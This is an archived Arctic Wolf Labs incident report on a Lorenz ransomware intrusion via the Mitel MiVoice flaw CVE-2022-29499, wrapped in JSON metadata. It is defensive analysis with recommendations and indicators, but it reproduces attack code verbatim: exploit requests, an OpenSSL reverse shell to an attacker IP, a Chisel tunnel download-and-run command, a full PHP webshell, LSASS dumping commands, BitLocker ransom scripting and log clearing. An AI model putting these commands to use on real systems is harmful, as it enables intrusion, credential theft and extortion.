{
    "id": "480208fb-59e5-4658-b4ef-bc766169d2b0",
    "created_at": "2023-01-12T15:00:34.63198Z",
    "updated_at": "2025-03-27T02:08:40.353698Z",
    "deleted_at": null,
    "sha1_hash": "71b95c38b9f63f3602e7e474135d6b380e1c4aef",
    "title": "2022-09-12 - Chiseling In- Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
    "authors": "",
    "file_creation_date": "2022-10-02T12:07:21Z",
    "file_modification_date": "2022-10-02T12:07:21Z",
    "file_size": 470736,
    "plain_text": "# Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free\n\n**[arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/](https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/)**\n\nby\nMarkus Neis, Ross Phillips, Steven Campbell, Teresa Whitmore, Alex Ammons, and Arctic Wolf Labs Team September 12, 2022\n\n## Key Takeaways\n\nArctic Wolf Labs assesses with medium confidence that the Lorenz ransomware group\n[exploited CVE-2022-29499 to compromise Mitel MiVoice Connect to gain initial access](https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002)\nLorenz waited nearly a month after obtaining initial access to conduct additional activity\nLorenz exfiltrated data via FileZilla\nEncryption was done via BitLocker and Lorenz ransomware on ESXi\nLorenz employed a high degree of Operational Security (OPSEC)\nRansomware groups continue to use Living Off the Land Binaries (LOLBins) and gaining\naccess to 0day exploits\n\n\n-----\n\nProcess and PowerShell Logging can significantly aid incident responders and potentially help\ndecrypt encrypted files\n\n## Background\n\nThe [Arctic Wolf Labs team recently investigated a Lorenz ransomware intrusion, which leveraged a](https://arcticwolf.com/labs/)\n[Mitel MiVoice VoIP appliance vulnerability (CVE-2022-29499) for initial access and Microsoft’s](https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002)\nBitLocker Drive Encryption for data encryption. Lorenz is a ransomware group that has been active\n[since at least February 2021 and like many ransomware groups, performs double-extortion by](https://arcticwolf.com/resources/blog/dangers-of-double-and-triple-extortion/)\nexfiltrating data before encrypting systems. Over the last quarter, the group has primarily targeted\nsmall and medium businesses (SMBs) located in the United States, with outliers in China and\nMexico.\n\nMonitoring just critical assets is not enough for organizations, security teams should monitor all\nexternally facing devices for potential malicious activity, including VoIP and IoT devices. Threat\nactors are beginning to shift targeting to lesser known or monitored assets to avoid detection. In the\ncurrent landscape, many organizations heavily monitor critical assets, such as domain controllers\nand web servers, but tend to leave VoIP devices and IoT devices without proper monitoring, which\nenables threat actors to gain a foothold into an environment without being detected.\n\n## Technical Analysis\n\n### Initial Access\n\nInitial malicious activity originated from a Mitel appliance sitting on the network perimeter. Lorenz\nexploited CVE-2022-29499, a remote code execution vulnerability impacting the Mitel Service\n[Appliance component of MiVoice Connect, to obtain a reverse shell and subsequently used Chisel as](https://github.com/jpillora/chisel)\na tunnelling tool to pivot into the environment.\n\n[In late-June, researchers at CrowdStrike published a blog article detailing the vulnerability and a](https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/)\nsuspected ransomware intrusion attempt leveraging it for initial access. Although post-exploitation\ndetails were limited, Arctic Wolf Labs observed significant overlap in the reported Tactics,\nTechniques, and Procedures (TTPs) tied to initial access.\n\nThe following GET requests were observed, leading to successful exploitation of CVE-2022-29499:\n```\n\"GET /scripts/vtest.php?\nget_url=http://127.0.0.1/ucbsync.php%3fcmd=syncfile:db_files/favicon.ico:137.184.181[.]252/%2\n HTTP/1.1\" 200 42\n\n\"GET /ucbsync.php?cmd=syncfile:db_files/favicon.ico:137.184.181[.]252/$PWD|sh|? HTTP/1.0\" 200\n\n```\nAfter successful exploitation, the threat actors leveraged cURL to download a shell script called\nwc2_deploy\n```\nGET //shoretel/wc2_deploy HTTP/1.1\n\nUser-Agent: curl/7.29.0\n\nHost: 137.184.181.252\n\nAccept: */*\n\n```\n\n-----\n\nThe wc2_deploy shell script, when executed, establishes an SSL-encrypted reverse shell using\nliving-off-the-land techniques via the mkfifo command and OpenSSL.\n```\nmkfifo /tmp/.svc_bkp_1; /bin/sh -i < /tmp/.svc_bkp_1 2>&1|\n\nopenssl s_client -quiet -connect 137.184.181[.]252:443 > /tmp/.svc_bkp_1;\n\nrm /tmp/.svc_bkp_1\n\n```\nA packet capture demonstrated that the reverse shell established on 137.184.181[.]252:443 was a\nncat SSL listener.\n```\n<SNIP>\n\n`0...localhost0K..`.H...B.\n\n.>.<Automatically generated by Ncat. See https://nmap.org/ncat/.0\n\n</SNIP>\n\n### Post-Exploitation Activity\n\n```\nOnce a reverse shell was established, the threat actors made use of the Mitel device’s command line\ninterface (stcli) to create a hidden directory and proceeded to download a compiled binary of the\n[open source TCP tunneling tool Chisel directly from Github via wget. The threat actors renamed the](https://github.com/jpillora/chisel)\nChisel binary to mem, unzipped it, and then executed it to establish a connection back to a Chisel\nserver listening at hxxps[://]137.184.181[.]252[:]8443, skipping TLS certificate verification and turning\nthe client into a SOCKS proxy for the threat actor.\n```\nstcli \n\nsu \n\nmkdir /tmp/.coreDump/ && cd /tmp/.coreDump/ && wget https://github.com/jpillora/chisel/rel\n\neases/download/v1.7.6/chisel_1.7.6_linux_386.gz -O /tmp/.coreDump/mem.gz && gzip -d /tmp/\n\n.coreDump/mem.gz && chmod 777 /tmp/.coreDump/mem && /tmp/.coreDump/mem client\n\n--tls-skip-verify --fingerprint '<Redacted>' https://137.184.181[.]252:8443 R:socks & exit\n\n```\n**Context** Chisel\n\n**SHA256** 97ff99fd824a02106d20d167e2a2b647244712a558639524e7db1e6a2064a68d\n\n**Filename** mem\n\n### Persistence\n\nIt is worth noting that, after exploitation of the Mitel device, Lorenz did not immediately proceed with\nany further activity for about a month. Upon returning to the Mitel device, the threat actors interacted\nwith a webshell named pdf_import_export.php located in the path /vhelp/pdf/en/. The webshell\nexpects a triple base64 encoded command sent via POST request.\n```\n<?php if(isset($_POST[\"ucba\"])){try { $kka=$_POST[\"ucba\"];\n\n$lalldl=base64_decode(base64_decode(base64_decode($kka)));\n\n$handle = popen(\"$lalldl 2>&1\", \"r\");\n\n$read = fread($handle, 2096);\n\necho base64_encode(base64_encode(base64_encode($read))).\"|\\n\"\n\n;pclose($handle); } catch (Exception $e) {}; };?>\n\n```\n**Context** Webshell\n\n\n-----\n\n**SHA256** 07838ac8fd5a59bb741aae0cf3abf48296677be7ac0864c4f124c2e168c0af94\n\n**Filename** pdf_import_export.php\n\nWe have medium confidence that the webshell was placed onto the device during the initial\nexploitation. This is based on no additional exploitation activity being observed upon returning to the\nMitel device.\n\nShortly after interacting with the webshell, we observed the Mitel device initiate a reverse shell and\nChisel tunnel again. This time using 138.68.59[.]16[:]443 for the SSL ncat reverse shell and\nhxxps[://]138.68.59[.]16[:]8443 for Chisel. Lorenz went on to leverage Chisel’s SOCKS functionality\nto pivot into the victim’s network.\n\n### Credential Access\n\n[The threat actors relied heavily on CrackMapExec for follow-on activity through the SOCKS tunnel.](https://github.com/Porchetta-Industries/CrackMapExec)\n\n[CrackMapExec was first used to dump credentials remotely via comsvcs, implemented via the lsassy](https://github.com/Hackndo/lsassy)\nmodule. The module first identifies the PID of the Local Security Authority Subsystem Service\n(LSASS) and then creates a full LSASS memory dump.\n```\nCmD.eXe /Q /c for /f \\\"tokens=1,2 delims= \\\" ^%A in ('\\\"tasklist /fi \\\"Imagename eq\nlsass.exe\\\"\n\n| find \\\"lsass\\\"\\\"')\n\ndo rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump ^%B \\\\Windows\\\\Temp\\\\kMekF.dbf\nfull\n\n```\nInvestigating PowerShell logs we identified that this activity was quickly followed by Out-Minidump\nwhich abuses Windows Error Reporting to dump LSASS memory and is like comsvcs, implemented\n[in CrackMapExec as part of the lsassy module.](https://github.com/Hackndo/lsassy)\n```\npowErsHeLl.eXE -NoP $WER =\n[PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\n;$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');\n\n$Flags = [Reflection.BindingFlags] 'NonPublic, Static';\n\n$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);\n\n$ProcessDumpPath = '\\Windows\\Temp\\bSpRLV.tar';\n\n$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);\n$p=Get-Process lsass;\n\n$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,\n[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))\n\n;$FileStream.Close()\n\n### Discovery\n\n```\nAfter dumping credentials, the threat actor began network and domain enumeration activity. They\n[first leveraged certutil to identify the Active Directories Certificate Authorities (CA) registered within](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732443(v=ws.11))\nthe forest and the server hosting the service.\n```\ncertutil --config - -ping\n\n```\n\n-----\n\n[netsh was then used to display the firewall status immediately followed by ipconfig to display the](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj129394(v=ws.11))\n[TCP/IP configuration for all adapters followed by netstat to enumerate all active TCP connections.](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961504(v=ws.11))\n```\nnetsh advfirewall show allprofiles state\n\nipconfig /all\n\nnetstat -anp tcp\n\n```\nThe threat actors searched through compromised device directories looking for passwords by doing\n[a recursive listing of file contents and leveraging the Windows command findstr.](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732459(v=ws.11))\n```\ncmd.exe /C Dir /s/b E:\\\\<REDACTED\\\\ |findstr passw\n\n```\nAdditionally the threat actors checked for running instances of PowerShell.\n```\ncmd.exe /C tasklist /v | findstr PowerShell.exe\n\n### Privilege Escalation and Lateral Movement\n\n```\nLorenz obtained credentials for two privileged administrator accounts, one with local admin privileges\nand one with domain admin privileges. These accounts were used to move laterally through the\nenvironment via RDP and subsequently to a domain controller.\n\n### Exfiltration\n\nPrior to beginning encryption, the threat actors leveraged the compromised administrator accounts to\ninstall FileZilla. FileZilla was then used to exfiltrate data via SSH on port 22 to one of the following IP\naddresses:\n\n**IP address** **Country** **ASN** **ASN Organisation**\n\n138.197.218[.]11 US 14061 DIGITALOCEAN-ASN\n\n138.68.19[.]94 US 14061 DIGITALOCEAN-ASN\n\n159.65.248[.]159 US 14061 DIGITALOCEAN-ASN\n\n206.188.197[.]125 NL 399629 BL Networks\n\n64.190.113[.]100 US 399629 BL Networks\n\n### Encryption\n\nLorenz leveraged Microsoft’s BitLocker Drive Encryption by creating a file called worm.txt and then\nexecuting the file on the domain controller remotely via atexec.\n```\ncmd.exe /C powershell.exe Get-Content C:\\\\<Redacted>\\worm.txt| PowerShell.exe -noprofile - >\nC:\\\\Windows\\Temp\\dlGjphUt.tmp 2>&1\n\n```\nThrough existing PowerShell logging we identified the contents of worm.txt, which contained\nPowerShell code to obtain a list of all computers and then remotely create a scheduled task named\nnetwork. The scheduled task would obtain the contents from \\\\<REDACTED\n\n-----\n\nDOMAIN>\\NETLOGON\\security_watermark.jpg and immediately run, starting the encryption\nprocess.\n```\n$cred = New-Object System.Management.Automation.PSCredential ('<REDACTED-DOMAIN>\\<REDACTEDUSER>', $password);$comp=Get-WmiObject -Namespace root\\directory\\ldap -Class ds_computer |\nselect ds_cn;$comp= $comp | Sort-Object {Get-Random;}Foreach ($c in $comp){Invoke-Command ComputerName $c.ds_cn -Credential $cred -ScriptBlock {SCHTASKS /CREATE /F /ru 'SYSTEM' /SC\nONLOGON /TN 'network' /TR 'powershell.exe Get-Content \\\\<REDACTEDDOMAIN>\\NETLOGON\\security_watermark.jpg | PowerShell.exe -noprofile -';SCHTASKS /Run /TN\n'network'} -AsJob;}\n\n```\nBecause of the sensitivity we can only provide some parts of network  (which is actually a\nPowerShell script, not a jpeg image).\n\nThe first portion of network adds multiple keys to the registry via the reg add command to prepare\nthe devices for BitLocker encryption. The key RecoveryKeyMessage contained the unique Lorenz\nransomware Tor URL to conduct negotiations between the threat actor and victim. The BitLocker\nrecovery message would then be displayed on the pre-boot key recovery screen after the device was\nencrypted.\n```\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v UseTPM /t REG_DWORD /d 2 /f;\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v UseTPMKey /t REG_DWORD /d 2 /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v RecoveryKeyMessage /t REG_SZ /d\n'http://<REDACTED-LORENZ-LINK.ONION>' /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d\n2 /f;\n\nREG ADD HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f;\n\n```\n**Note: In some instances the reg add command would fail if**\nHKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE does not exist, inhibiting encryption on some devices.\n\nNext security_watermark.jpg attempts to install BitLocker, including all role services and applicable\nmanagement tools, via the Install-WindowsFeature cmdlet. This was followed by enabling BitLocker\nvia the PowerShell cmdlet enable-BitLocker.\n```\nInstall-WindowsFeature BitLocker -IncludeAllSubFeature -IncludeManagementTools Restart;\"enable-BitLocker -EncryptionMethod Aes256 -password(ConvertTo-SecureString [REDACTED\nPASSWORD] -AsPlainText -Force) -mountpoint D: -PasswordProtector -skiphardwaretest UsedSpaceOnly\"\n\n```\nNote the -password parameter contains an $UnsecurePassword string. Capturing the plaintext\npassword allowed the victim to decrypt nearly 95% of their encrypted endpoints.\n\nThe threat actors kept track of the encryption progress by sending an HTTP POST request to\nhxxp://206.188.197[.]125 (one of the IP addresses used for data exfiltration) via the InvokeWebRequest. The POST request included the encryption progress displayed as a percentage.\n```\nInvoke-WebRequest -Uri hxxp://206.188.197[.]125/ -Method POST -Body ($postParams| ConvertToJson);Write-Progress -Activity 'Encrypting volume $($<variable>.MountPoint)' -Status\n'Encryption Progress:' -PercentComplete $<variable>.EncryptionPercentage;\n\n```\n\n-----\n\nAfter the encryption process the script clears all event logs.\n```\nGet-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\n\n```\nAlthough Lorenz primarily leveraged BitLocker for encryption, we observed a select few ESXi hosts\nwith Lorenz ransomware.\n\n## Recommendations\n\n### Upgrade to MiVoice Connect Version R19.3\n\nIn July 2022, Mitel released MiVoice Connect version R19.3, which fully remediates CVE-202229499. We recommend upgrading to version R19.3 to prevent potential exploitation of this\nvulnerability. On April 19, 2022, Mitel provided a script for releases 19.2 SP3 and earlier, and R14.x\nand earlier as a workaround before the release of R19.3.\n\n**Note: Arctic Wolf recommends following change management best practices for deploying security**\npatches, including testing changes in a dev environment before deploying to production to avoid\noperational impact.\n\n**Product** **Impacted Versions** **Fixed Version**\n\n\nMiVoice Connect R19.2 SP3 and earlier\nR14.x and earlier\n\n\nMiVoice Connect R19.3\n[Mitel Security Advisory](https://www.mitel.com/-/media/mitel/file/pdf/support/security-advisories/security-bulletin_22-0002-001-v2.pdf)\n\n\n### Scan External Appliances and Web Applications\n\nExternal scans are an integral part in assessing your organization’s footprint and hardening your\nenvironment and security posture. You cannot protect assets that you do not know about and\nexternal scans can help your organization discover those assets. Furthermore, external scans can\nhelp define an organization’s attack surface across devices exposed to the Internet.\n\n### Do Not Expose Critical Assets Directly to the Internet\n\nUpon reviewing external scan results, ensure critical assets are not directly exposed to the Internet.\nIf a device does not need to be on the perimeter, remove it. Removing a device from your network\nperimeter will reduce your organization’s attack surface.\n\n### Configure PowerShell Logging\n\nArctic Wolf Labs is continuously investigating attacks in which PowerShell was used extensively\nthroughout all phases of the attack. We recommend to turn on Module Logging, Script Block\nLogging, and Transcription Logging and send logs to a centralised logging solution\n\n### Configure Off-Site Logging\n\n\n-----\n\nAlways ensure that critical assets are monitored and that captured logs are stored externally to your\norganization. Otherwise, detailed forensic analysis options may be limited when threat actors take\nevasive actions to hide their tracks.\n\n### Backups\n\nEstablish a tested online – offline backup strategy for data as well as gold images and identify weak\npoints a threat actor might exploit. Saving just one backup file will not be enough to ensure your data\nis protected and recoverable.\n\n### Limit the Blast Radius of Potential Attacks\n\nTo limit the amount of damage that would be inflicted in a potential attack, privileged credentials\nshould never be exposed on lower-tier assets. By adhering to this principle, the likelihood that a\nthreat actor would be able to successfully gain access to a domain controller is reduced.\nImplementing logical network segmentation based on privileges limits a threat actor’s ability to move\nlaterally (e.g., restricting domain administrators from logging into workstations).\n\n### Detections\n\n**Network Detections**\n\nArctic Wolf Labs has created custom Suricata rules to aid in identification of the malicious activity\ndescribed in this blog.\n\nThe rules can be downloaded here: https://github.com/rtkwlf/wolf-tools/threat-intelligence/lorenzransomware-chiseling-in/lorenz-suricata.rules\n\nThe following Snort signatures available in Emerging Threats’ ET Community ruleset can also be\nused to detect relevant activity:\n\n[2037121 — ET EXPLOIT: Attempted Mitel MiVoice Connect Data Validation RCE Inbound](https://threatintel.proofpoint.com/sid/2037121)\n(CVE-2022-29499)\n[2001980 — ET POLICY: SSH Client Banner Detected on Unusual Port](https://threatintel.proofpoint.com/sid/2001980)\n\n**Endpoint Detections**\n\nArctic Wolf Labs has created custom Yara rules to aid in identification of the malicious activity\ndescribed in this blog.\n\nThe rules can be downloaded here: https://github.com/rtkwlf/wolf-tools/threat-intelligence/lorenzransomware-chiseling-in/lorenz-yara.yar\n\n[The following SIGMA rules shared by SigmaHQ can detect numerous endpoint TTPs used by Lorenz](https://github.com/SigmaHQ/sigma)\n\n### Indicators of Compromise\n\n Note: A full copy of these IOCs can be downloaded as a CSV file here\n\n\n-----\n\n**Indicator** **Type** **Context**\n\n\n137.184.181[.]252 IP\nAddress\n\n138.197.218[.]11 IP\nAddress\n\n138.68.19[.]94 IP\nAddress\n\n138.68.59[.]16 IP\nAddress\n\n159.65.248[.]159 IP\nAddress\n\n206.188.197[.]125 IP\nAddress\n\n64.190.113[.]100 IP\nAddress\n\n97ff99fd824a02106d20d167e2a2b647244712a558639524e7db1e6a2064a68d SHA256\n\n07838ac8fd5a59bb741aae0cf3abf48296677be7ac0864c4f124c2e168c0af94 SHA256\n\n### ATT&CK Matrix\n\n\nUsed to\nexploit the\nMitel\ndevice\n(CVE202229499)\n\nData\nexfiltration\nvia\nFileZilla\n\nData\nexfiltration\nvia\nFileZilla\n\nUsed to\ndownload\nChisel\n\nData\nexfiltration\nvia\nFileZilla\n\nData\nexfiltration\nvia\nFileZilla;\nHTTP\nPOST\nrequests\nto notify\nthreat\nactors of\nencryption\nprogress\n\nData\nexfiltration\nvia\nFileZilla\n\nChisel\n\nWebshell\n\n\n-----\n\n**Tactic** **ID** **Name** **Details**\n\n\nInitial Access [T1190](https://attack.mitre.org/techniques/T1190) Exploit Public-Facing\nApplication\n\n\nResource\nDevelopment\n\n\n[T1588.002](https://attack.mitre.org/techniques/T1588/002) Obtain Capabilities –\nTools\n\n\n[T1587.001](https://attack.mitre.org/techniques/T1587/001/) Develop\nCapabilities –\nMalware\n\n\nLorenz developed the\nBitLocker deployment\nscript.\n\n\nPersistence [T1505.003](https://attack.mitre.org/techniques/T1505/003/) Server Software\nComponent – Webshell\n\n\nCommand &\nControl\n\n\n[T1095](https://attack.mitre.org/techniques/T1095/)\n[T1090](https://attack.mitre.org/techniques/T1090/)\n\n\nLorenz exploited CVE-202229499 on an exposed Mitel\ndevice, achieving Remote Code\nExecution (RCE).\n\nFileZilla was downloaded by\nLorenz to exfiltrate data.\nChisel a TCP Tunneling tool was\ndownloaded from Github by\nLorenz.\n\nLorenz created a webshell on the\nvulnerable device for persistence.\n\nChisel client was used to create a\nSOCKS5 connection over port\n8443 to attacker controlled IP.\n\n\n[T1573](https://attack.mitre.org/techniques/T1573) Encrypted\nChannel\n\n\nNon-Application Layer\nProtocol\nProxy\n\nReverse shell used a\nlocalhost TLS certificate\nfor encryption.\n\n\nCredential\nAccess\n\n\n[T1003.001](https://attack.mitre.org/techniques/T1003/001/) LSASS Memory CrackMapExec using lsassy to\ndump LSASS remotely.\n\n\nExecution [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting\nInterpreter – Powershell\n\n[T1059.003](https://attack.mitre.org/techniques/T1059/003/) Command and\nScripting\nInterpreter –\nWindows\nCommand Shell\n\n[T1112](https://attack.mitre.org/techniques/T1112) Modify Registry The deployment\nPowerShell script added\nregistry keys that are\nrequired for BitLocker\nconfiguration.\n\n\nPowerShell and Windows\ncommand shell were both used to\nlaunch malware as well as\ninteract with Windows utilities and\nnative APIs.\n\n\n-----\n\n[T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task atexec was used via Task\nScheduler.\nThe BitLocker encryption\nwas initiated via\nScheduled Task.\n\nDiscovery [T1016](https://attack.mitre.org/techniques/T1016/) System Network\nDiscovery\n\n[T1518.001](https://attack.mitre.org/techniques/T1518/001/) Security Software\nDiscovery\n\n\nLorenz used various commands\nto gather network information\n(netstat, ipconfig, netsh, certutil,\netc.)\n\n\n[T1083](https://attack.mitre.org/techniques/T1083) File and Directory\nDiscovery\n\n\nLorenz recursively\nsearched through\ndirectories on the initially\ncompromised device\nlooking for passwords.\n\n\nPrivilege\nEscalation\n\n\n[T1078.002](https://attack.mitre.org/techniques/T1078/002/) Domain Accounts Lorenz obtained domain\nadministrator credentials\n\n\n[T1078.003](https://attack.mitre.org/techniques/T1078/003/) Local Accounts Lorenz obtained local\nadministrator credentials\n\n\nLateral\nMovement\n\n\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/) Remote Services –\nRemote Desktop Protocol\n\n\nLorenz used obtained local and\ndomain administrator credentials\nto move laterally via RDP.\n\nThe data was exfiltrated to\nattacker controlled IPs using\nFileZilla SFTP over port 22.\n\n\n[T1078.002](https://attack.mitre.org/techniques/T1078/002/) Valid Accounts –\nDomain Accounts\n\n[T1078.003](https://attack.mitre.org/techniques/T1078/003/) Valid Accounts –\nLocal Accounts\n\n\nData\nExfiltration\n\n\n[T1048.002](https://attack.mitre.org/techniques/T1048/002/) Exfiltration Over\nAsymmetric Encrypted\nNon-C2 Protocol\n\n\nImpact [T1486](https://attack.mitre.org/techniques/T1486) Data Encrypted for Impact Lorenz leveraged BitLocker to\nencrypt systems.\nLorenz encrypted ESXi\n\n\n[T1529](https://attack.mitre.org/techniques/T1529) System\nShutdown/Reboot\n\n\nThe PowerShell script\nincluded a command to\nshutdown and restart\nhost.\n\n\nDefense\nEvasion\n\n\n[T1070.001](https://attack.mitre.org/techniques/T1070/001) Indicator Removal on\nHost – Clear Windows\nEvent Log\n\n\nEvent logs were cleared.\n\n\n-----\n\n[T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files\nor Information\n\nhttps://youtu.be/g2mQs1gVKKo\n\n## References\n\n\nThe BitLocker deployment\nPowerShell script had a\nJPG extension.\n\n\nWatch Video At:\n\n\n[https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002](https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002)\n\n[https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/](https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/)\n\n### By Markus Neis, Ross Phillips, Steven Campbell, Teresa Whitmore, Alex Ammons, and Arctic Wolf Labs Team\n\n**Markus Neis**\n\nMarkus Neis is a Principal Threat Intelligence Researcher in Arctic Wolf Labs focused on leading\nadvanced threat research. He has more than a decade of experience in researching adversary\ntradecraft and responding to sophisticated attacks.\n\n**Ross Phillips**\n\nRoss is a Sr. Threat Intelligence Researcher at Arctic Wolf Labs with almost a decade of experience\nin the security landscape. Prior to this, Ross worked as a Technical Lead for the Arctic Wolf SOC and\nan Internal Tech Resident at Google after graduating from Rochester Institute of Technology in 2012\nmajoring in Information Security & Forensics.\n\n**Steven Campbell**\n\n\n-----\n\nSteven Campbell is a Threat Intelligence Researcher at Arctic Wolf Labs and has more than eight\nyears of experience in intelligence analysis and security research. He has a strong background in\ninfrastructure analysis and adversary tradecraft.\n\n**Teresa Whitmore**\n\nTeresa Whitmore is a Forensic Analyst at Tetra Defense, an Arctic Wolf company, focused on leading\nincident response and digital forensic investigations. She has more than a decade of combined\nexperience in DFIR, cyber defense operations, and malware analysis.\n\n**Alex Ammons**\n\nAlex Ammons is a forensics analyst at Tetra Defense, an Arctic Wolf company, and has numerous\ncertifications and operational experience from the Department of Defense and National Security\nAgency. Alex is seasoned in incident response and offensive and defensive cyber operations.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-12 - Chiseling In- Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free.pdf"
    ],
    "report_names": [
        "2022-09-12 - Chiseling In- Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535634,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1664712441,
    "ts_modification_date": 1664712441,
    "files": {
        "pdf": "https://archive.orkl.eu/71b95c38b9f63f3602e7e474135d6b380e1c4aef.pdf",
        "text": "https://archive.orkl.eu/71b95c38b9f63f3602e7e474135d6b380e1c4aef.txt",
        "img": "https://archive.orkl.eu/71b95c38b9f63f3602e7e474135d6b380e1c4aef.jpg"
    }
}